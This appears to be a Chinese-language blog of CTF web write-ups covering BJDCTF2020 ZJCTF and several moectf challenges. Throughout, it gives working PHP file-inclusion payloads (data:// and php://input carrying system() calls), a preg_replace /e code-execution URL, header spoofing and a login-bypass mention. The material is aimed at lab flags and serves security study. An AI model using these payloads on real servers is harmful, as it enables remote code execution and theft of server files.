+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);   //   . 是拼接的意思</span><br></pre></td></tr></table></figure>
+
+<p>自动拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);?&gt;.php                             ?&gt;   :  php只读到这里，houmianbuyunxing</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php system(&#x27;cat /flag 文件的完整名称&#x27;);//.php                ’//‘   ：  注释</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>data: 伪协议 代码就嵌在 URL 里，get就行</p>
+<p>php:&#x2F;&#x2F;input 伪协议：得另外用post传代码。</p>
+<p>举例:</p>
+<ul>
+<li><p>用 data:        URL 里直接写<code>?file=data:text/plain,&lt;?php 执行代码 ?&gt;</code>，一步到位；   </p>
+<ul>
+<li><p>​            ?file&#x3D;data:数据类型,要执行的代码&#x2F;&#x2F;            其中text&#x2F;plain：指定数据类型 纯文本 </p>
+<p>​                                         <code>,</code>：分隔符</p>
+</li>
+</ul>
+</li>
+<li><p>用 php:&#x2F;&#x2F;input：URL 里只写<code>?file=php://input</code>，然后在 POST 里单独传<code>&lt;?php 执行代码 ?&gt;</code>，分两步</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:16898</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:16898  # 你的目标地址和端口</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0  # 浏览器标识，随便填</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded  # 内容类型，可省略</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30  # 请求体的字符长度（下面代码的长度）</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag.txt&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="1-题解-c！"><a href="#1-题解-c！" class="headerlink" title="1   题解 c！"></a>1   题解 c！</h3><p>在 PHP 中，<code>preg_replace</code> 是一个强大的正则表达式替换函数。它可以在一个字符串中使用正则表达式搜索和替换指定的文本。</p>
+<p>函数语法如下：<br>preg_replace($pattern, $replacement, $subject);</p>
+<p>这里的 <code>$pattern</code> 是一个正则表达式字符串，用于指定搜索的模式， <code>$replacement</code> 是替换成的字符串， <code>$subject</code> 是要搜索和替换的原始字符串或字符串数组。</p>
+<p><code>preg_replace</code> 函数返回一个替换后的字符串或数组。</p>
+<p>1.观察代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);         //关闭报错反馈，url中要有&quot;text&quot;参数，url中要有&quot;file&quot;参数</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;       //存在$text参数  and  查找名称为$text的文件且文件内容为&quot;I                                                严格等于                                                               have a dream&quot;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;     //回显获取的文件内容</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php               //文件包含，将名为$file的文件引入此php代码(后面的next.php注释就代表下个php就这文件了)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1.1 <code>isset()</code>：函数，意思是 “检查变量是否存在且不为空”。</p>
+<p>判断 “你有没有传<code>text</code>参数”—— 如果没传<code>text</code>，或者传了但值是空的，就不满足这句话了</p>
+<p>1.2 <code>r</code>是<code>read</code>（读取）的缩写，告诉 PHP：“我只想读取<code>$text</code>指向的内容，不做写入、修改等操作”</p>
+<p>1.3 <code>file_get_contents()</code>能识别 PHP 伪协议，不用依赖服务器上的任何真实文件</p>
+<p>2.理解：<a href=""></a></p>
+<p>你现在需要一个现成的文件然后里面内容是：</p>
+<p>但是没有现成的文件</p>
+<p>所以我们构造一个，使用伪协议就ok</p>
+<p>  伪协议使用：   php:&#x2F;&#x2F;input</p>
+<p>3.使用</p>
+<p>用burpsuite抓包改报头，伪协议使用php:&#x2F;&#x2F;input，格式如下 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /..?参数=php://input</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php代码</span><br></pre></td></tr></table></figure>
+
+<p>发现也没啥</p>
+<p>4.继续，构造**$file**</p>
+<p>前面代码分析过了**$file**的值极有可能是next.php，写上来试试</p>
+<p><strong>POST</strong> &#x2F;?<strong>text</strong>&#x3D;<strong>php:&#x2F;&#x2F;input</strong>&amp;<strong>file</strong>&#x3D;<strong>next.php</strong> <strong>HTTP&#x2F;1.1</strong></p>
+<p>得到base64一堆密码，解码并读取</p>
+<p>5.读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">// 核心函数：用/e修饰符 会执行代码</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(         </span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        // $re是你传的参数名（正则），/ei会执行替换后的代码</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,        // \\1是匹配到的$str内容，会被当成代码执行</span><br><span class="line">        $str                        // $str是你传的参数值</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">// str 会被放进 \\1 里面，</span><br><span class="line">  strtolower(&quot;\\1&quot;)会被放进 (&#x27; . $re . &#x27;) 里面</span><br><span class="line">  变成  strtolower(&quot;str&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 遍历所有GET参数：参数名→$re，参数值→$str</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;  // 调用complex函数，触发preg_replace</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 目标函数：执行cmd命令</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);  // 只要调用这个函数，就能执行cmd参数</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>6.构造</p>
+<p>​    $re &#x3D; 	S*   		 cmd</p>
+<p>​    $str &#x3D;	{${getFlag()}}       system(‘ls’)</p>
+<p>&#x2F;&#x2F; str 会被放进 \1 里面，<br>  strtolower(“\1”)会被放进 (‘ . $re . ‘) 里面<br>  变成  strtolower(“str”)</p>
+<p>1.得到strtolower(“{${getFlag()}}”)，遇到&#x2F;e执行getFlag()</p>
+<p>2.执行，因为cmd&#x3D;system(‘ls’)，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_GET[&#x27; cmd &#x27;])便变成了@eval(system(&#x27;ls&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><code>eval()</code>会把这个字符串当成 PHP 代码来运行</p>
+<p>所以能得到ls显示结果</p>
+<p>所以我们构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标地址/next.php?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>得到：相应内容；</p>
+<p>以此类推，找到flag，cat它</p>
+<p>bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var system(‘ls ..&#x2F;..&#x2F;..&#x2F;..&#x2F;‘);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标地址/next.php&amp;\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);   //       cat /flag 表示读取根目录下的flag文件。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(url).../next.php&amp;\S*=&#123;<span class="variable">$&#123;getFlag()&#125;</span>&#125;&amp;cmd=system(<span class="string">&#x27;linux命令&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Moe-web-笑传之猜猜爆"><a href="#Moe-web-笑传之猜猜爆" class="headerlink" title="Moe web 笑传之猜猜爆"></a>Moe web 笑传之猜猜爆</h2><p>源代码中：<script src="/static/main.js"></script> </p>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>猜数字游戏</title>
+    <link rel="stylesheet" href="/static/style.css">
+  </head>
+  <body>
+    <h1>猜数字游戏</h1>
+    <p>我刚才随机选定了一个10000以内的自然数。你有多达 <b>1</b> 次的机会猜中它！我会告诉你猜的高了还是低了...（这好像没有用？对吗？哈哈哈哈）</p>
+    <div class="form">
+      <label for="guessField">请猜数：</label>
+      <input type="number" id="guessField" class="guessField" min="1" max="10000">
+      <button id="guessBtn">我猜</button>
+    </div>
+    <div class="resultParas">
+      <p class="guesses"></p>
+      <p class="lastResult"></p>
+      <p class="lowOrHi"></p>
+      <p class="flagResult"></p>
+    </div>
+    <script src="/static/main.js"></script>
+  </body>
+</html>
+
+
+<p>1.进入&#x2F;static&#x2F;main.js</p>
+<p>看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(userGuess === randomNumber) &#123;</span><br><span class="line">   lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;</span><br><span class="line">   lastResult.style.backgroundColor = &#x27;green&#x27;;</span><br><span class="line">   lowOrHi.textContent = &#x27;&#x27;;</span><br><span class="line">   guessField.disabled = true;</span><br><span class="line">   guessBtn.disabled = true;</span><br><span class="line">   // 猜对后请求flag</span><br><span class="line">   fetch(&#x27; if(userGuess === randomNumber) &#123;</span><br><span class="line">   lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;</span><br><span class="line">   lastResult.style.backgroundColor = &#x27;green&#x27;;</span><br><span class="line">   lowOrHi.textContent = &#x27;&#x27;;</span><br><span class="line">   guessField.disabled = true;</span><br><span class="line">   guessBtn.disabled = true;</span><br><span class="line">   // 猜对后请求flag</span><br><span class="line">   fetch(&#x27;/flag&#x27;, &#123;method: &#x27;POST&#x27;&#125;)</span><br><span class="line">     .then(res =&gt; res.json())</span><br><span class="line">     .then(data =&gt; &#123;</span><br><span class="line">       document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;</span><br><span class="line">     &#125;);</span><br><span class="line">   setGameOver();&#x27;, &#123;method: &#x27;POST&#x27;&#125;)</span><br><span class="line">     .then(res =&gt; res.json())</span><br><span class="line">     .then(data =&gt; &#123;</span><br><span class="line">       document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;</span><br><span class="line">     &#125;);</span><br><span class="line">   setGameOver();</span><br></pre></td></tr></table></figure>
+
+<p>得知：POST直接去&#x2F;flag,得到flag</p>
+<h2 id="moectf-web-01-第一章-神秘的手镯-revenge"><a href="#moectf-web-01-第一章-神秘的手镯-revenge" class="headerlink" title="moectf web 01 第一章 神秘的手镯_revenge"></a>moectf web 01 第一章 神秘的手镯_revenge</h2><p>&#96;&#96;</p>
+<p>K皇：咳咳…其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在wanyanzhou.txt里面了……但是我忘记密码是啥了，而且不小心把保存密码的文件删了……</p>
+<p>HDdss：这…应该有备份吧？</p>
+<p>K皇：确实有，不过当时着急忘记了…输入太多错误密码，手镯直接锁死了，要连续输入500遍正确密码才能打开。</p>
+<p>&#96;&#96;</p>
+<p>源代码：</p>
+<table>
+<thead>
+<tr>
+<th><div class="challenge"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><p class="hint">「以万言咒启封，禁取巧之道」</p></td>
+</tr>
+<tr>
+<td><div class="input-area"></td>
+</tr>
+<tr>
+<td>&lt;textarea id&#x3D;”passwordInput”                    &#x2F;&#x2F;这里有id&#x3D;”passwordInput”</td>
+</tr>
+<tr>
+<td>placeholder&#x3D;”在此结印输入万言启封咒…”&gt;在此输入万言启封咒</textarea></td>
+</tr>
+<tr>
+<td><div class="warning">粘贴禁止！请手动输入！</div></td>
+</tr>
+<tr>
+<td></div></td>
+</tr>
+<tr>
+<td><button id="unsealButton">启封手镯</button>                                            &#x2F;&#x2F;这里有个button id&#x3D;”unsealButton”</td>
+</tr>
+<tr>
+<td></td>
+</tr>
+<tr>
+<td><!-- 验证结果区域 --></td>
+</tr>
+<tr>
+<td><div id="result"></div></td>
+</tr>
+<tr>
+<td></div></td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody></table>
+<p>1.访问 wanyanzhou.txt.bak，下载打开，得到密码</p>
+<p>2.发现不能复制粘贴，就去控制台执行脚本</p>
+<p>（难怪为什么老是执行不了，这设置了 debugger 设置断点来阻止自动化脚本，可以关闭）</p>
+<p>知识点：</p>
+<p>​	1.<code>setInterval(函数, 时间)</code>： <strong>“每隔 X 毫秒重复执行这个函数里的代码”</strong>，比如 <code>setInterval(function(){alert(&#39;hi&#39;)}, 1000)</code> 就是每隔 1 秒弹一次 “hi”。</p>
+<p>​	2.自动执行函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 里面的代码</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    // 1. 把文本内容定义好（就是你要输入的密码）</span><br><span class="line">    var text = &quot;你要输入的密码&quot;;</span><br><span class="line">    var count = 500; // 要点击的次数</span><br><span class="line">    var i = 0;</span><br><span class="line"></span><br><span class="line">    // 2. 定时重复执行：每次点击前重新填内容+点击</span><br><span class="line">    var interval = setInterval(function() &#123;</span><br><span class="line">        // 每次都重新获取元素（避免页面加载问题）</span><br><span class="line">        var input = document.getElementById(&quot;passwordInput&quot;);  //寻找页面里叫做passwordInput的东西，把他保存在input里面</span><br><span class="line">        var button = document.getElementById(&quot;unsealButton&quot;);</span><br><span class="line">        </span><br><span class="line">        if (i &gt;= count) &#123; // 达到次数就停止</span><br><span class="line">            clearInterval(interval);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (input &amp;&amp; button) &#123; // 这俩元素都在吗，在的话值为1，运行</span><br><span class="line">            input.value = text; // 先填内容（抵消“点击清空”的坑）</span><br><span class="line">            button.click(); // 再点击按钮</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        i++;</span><br><span class="line">    	&#125;, 10); // 每10毫秒执行一次（快速重复）</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="moectf-web-04-第四章-金曦破禁与七绝傀儡阵-题解"><a href="#moectf-web-04-第四章-金曦破禁与七绝傀儡阵-题解" class="headerlink" title="moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解"></a>moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解</h2><p>1.get传参</p>
+<p><code>url+stone_golem?key=xdsec</code></p>
+<p>这里有个疑问为什么不是<code>/?key=xdsec</code></p>
+<p>是因为这里的stone_golem是个文件不是个目录</p>
+<p>​	后端文件路径：<code>/var/www/html/stone_golem.php</code> → 访问 <code>stone_golem?key=xdsec</code>（省略<code>.php</code>）；</p>
+<p>​	后端目录路径：<code>/var/www/html/stone_golem/</code> → 访问 <code>stone_golem/?key=xdsec</code>（加<code>/</code>指向目录）。</p>
+<p>获得玉简碎片: bW9lY3Rme0Mw</p>
+<p>2.post传参</p>
+<p>bp改post，传入参数</p>
+<p>获得玉简碎片: bjZyNDd1MTQ3</p>
+<p>3.本地访问</p>
+<p>X-Forwarded-For:127.0.0.1</p>
+<table>
+<thead>
+<tr>
+<th>请求头字段（英文）</th>
+<th>解释</th>
+<th>举个例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Host</td>
+<td>告诉服务器 “我要访问你哪个网站”（一台服务器可能有多个网站，靠这个区分）</td>
+<td>比如访问百度，Host 就是<code>www.baidu.com</code></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>告诉服务器 “我用的啥设备 &#x2F; 浏览器”（比如你是用手机还是电脑，用 Chrome 还是 Edge）</td>
+<td>比如<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0</code>（代表 Windows 电脑 + Chrome 浏览器）</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>告诉服务器 “我是从哪个页面跳过来的”</td>
+<td>从<code>www.baidu.com</code>点进知乎，Referer 就是<code>www.baidu.com</code></td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>服务器给你的 “身份小票”（存着你的登录状态、账号信息，下次访问直接带过去，服务器就知道你是谁了）</td>
+<td>比如<code>user_id=123; token=abc123</code>（代表你是 123 号用户）</td>
+</tr>
+<tr>
+<td>X-Forwarded-For</td>
+<td>告诉服务器 “请求的真实来源 IP 是什么”</td>
+<td>比如<code>192.168.1.100</code>（你的本地 IP）</td>
+</tr>
+<tr>
+<td>Accept</td>
+<td>告诉服务器 “我能接收啥格式的内容”（比如要网页还是图片）</td>
+<td>比如<code>text/html,image/png</code>（要网页和图片）</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>告诉服务器 “我能解压啥压缩格式”（节省传输流量）</td>
+<td>比如<code>gzip, deflate</code>（支持这两种压缩）</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>告诉服务器 “我能看懂啥语言”（比如要中文还是英文页面）</td>
+<td>比如<code>zh-CN,zh;q=0.9</code>（优先中文）</td>
+</tr>
+</tbody></table>
+<p>获得玉简碎片: MTBuNV95MHVy</p>
+<p>4.修改浏览器</p>
+<p>改成<code>user-agent：moe browser</code></p>
+<p>获得玉简碎片: X2g3N1BfbDN2</p>
+<p>5.需要以xt的身份认证user!</p>
+<p>Cookie： use&#x3D;xt</p>
+<p>获得玉简碎片: M2xfMTVfcjM0</p>
+<p>6.你从哪里来</p>
+<p>改成：<strong>Referer</strong>: <a target="_blank" rel="noopener" href="http://panshi/entry">http://panshi/entry</a></p>
+<p>获得玉简碎片: bGx5X2gxOWgh</p>
+<p>7.put请求</p>
+<p>使用PUT方法，请求体为”新生！”</p>
+<p>用curl构造请求</p>
+<p>获得玉简碎片: fQ&#x3D;&#x3D;</p>
+<p>拼接：</p>
+<p>bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ&#x3D;&#x3D;</p>
+<p>解码：</p>
+<p>moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}</p>
+<h2 id="moectf-web-06-第六章-藏经禁制？玄机初探！"><a href="#moectf-web-06-第六章-藏经禁制？玄机初探！" class="headerlink" title="moectf web 06 第六章 藏经禁制？玄机初探！"></a>moectf web 06 第六章 藏经禁制？玄机初探！</h2><p>账号密码题目，万能密码破解</p>
+<p>得flag</p>
+<h2 id="moectf-web-07-第七章-灵蛛探穴与阴阳双生符"><a href="#moectf-web-07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="moectf web 07 第七章 灵蛛探穴与阴阳双生符"></a>moectf web 07 第七章 灵蛛探穴与阴阳双生符</h2><p>1.<strong>robots.txt</strong>：</p>
+<p>它就像网站给搜索引擎爬虫立的 “家规”</p>
+<p>放在网站根目录下（比如<code>https://xxx.com/robots.txt</code>）</p>
+<p>纯文本格式，写清楚 “哪些页面你能爬、哪些不能爬”。</p>
+<p><code>robots.txt</code>具体页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *  # 对所有爬虫生效</span><br><span class="line">Disallow: /admin/  # 禁止爬/admin/后台页面</span><br><span class="line">Allow: /article/  # 允许爬/article/文章页面</span><br></pre></td></tr></table></figure>
+
+<p>2.md5是啥</p>
+<p>答：MD5 是一种<strong>哈希算法</strong>，能把任意长度的内容转换成固定 128 位（32 个字符）的哈希值（比如<code>123</code>的 MD5 是<code>202cb962ac59075b964b07152d234b70</code>）。正常情况下不同内容的 MD5 值不同，但存在<strong>MD5 碰撞</strong>—— 即两个不同的内容，MD5 值完全一样。</p>
+<p>规定：MD5参数必须是字符串</p>
+<p>3.<code>?? &quot;&quot;</code>：如果 URL 里传了<code>a</code>参数，<code>$a</code>就等于传的值；没传<code>a</code>参数的话，<code>$a</code>就等于空字符串（避免报错）。</p>
+<h5 id="题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的-“协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。"><a href="#题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的-“协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。" class="headerlink" title="题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。"></a>题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎<strong>爬虫</strong>哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</h5><p>1.去访问robots.txt</p>
+<p>得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flag.php</span><br></pre></td></tr></table></figure>
+
+<p>2.访问：&#x2F;flag.php</p>
+<p>得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$flag = getenv(&#x27;FLAG&#x27;);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;</span><br><span class="line">$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if($a == $b)&#123;</span><br><span class="line">    die(&quot;error 1&quot;);		//a和b数值要不一样</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(md5($a) != md5($b))&#123;	//a和b哈希值要一样</span><br><span class="line">    die(&quot;error 2&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag</span><br></pre></td></tr></table></figure>
+
+<p>所以我们就要传a，b上去，并给他们赋值，要求：a和b数值要不一样；a和b哈希值要一样</p>
+<p>?a&#x3D;…&amp;b&#x3D;…</p>
